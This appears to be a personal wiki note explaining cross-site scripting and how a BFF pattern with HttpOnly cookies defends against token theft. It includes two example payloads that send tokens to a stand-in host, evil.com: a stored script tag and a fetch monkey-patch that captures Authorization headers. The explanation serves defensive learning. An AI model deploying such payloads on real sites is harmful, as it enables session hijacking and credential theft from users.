---
title: "XSS"
type: concept
created: 2026-04-11
updated: 2026-04-11
sources:
  - "[[Source---Entra-ID-App-Roles-BFF-JWT-Signing]]"
tags:
  - security
  - attack-vector
---

# XSS (Cross-Site Scripting)

An attack where malicious JavaScript is injected into a web page and executed in a victim user's browser, with full access to the page's JavaScript context.

## How Injection Happens

The attacker does NOT need access to the server's codebase. Injection happens through **unsanitized user input** that gets rendered on the page.

Example: a comment field stores this string in the database:
```html
<script>fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))</script>
```
If the frontend renders comments without sanitizing HTML, this script executes in every visitor's browser.

## Token Theft via Fetch Monkey-Patching

Even when tokens are stored in **browser memory** (not `localStorage`), XSS can steal them by intercepting outgoing requests:

```javascript
const orig = window.fetch;
window.fetch = function(url, options) {
  if (options?.headers?.Authorization) {
    // exfiltrate the Bearer token as it leaves the browser
    fetch('https://evil.com/steal?t=' + options.headers.Authorization);
  }
  return orig.apply(this, arguments);
};
```

The token must travel through `fetch` to reach the API — at that moment the injected script intercepts it. This is why "token in memory" does not fully protect against XSS.

## Defense: HttpOnly Cookie (BFF Pattern)

The [[BFF-Pattern]] eliminates this by keeping the access token server-side and giving the browser only an HttpOnly session cookie. `HttpOnly` makes the cookie invisible to JavaScript — `document.cookie` does not show it, and no script can read its value.

## Connections

- [[BFF-Pattern]] — the architectural pattern that neutralizes XSS token theft
- [[JWT]] — the token XSS attacks try to steal
- [[MSAL]] — stores tokens in browser memory in Pattern 1 (SPA), which is vulnerable to fetch monkey-patching
- [[Source---Entra-ID-App-Roles-BFF-JWT-Signing]] — source session
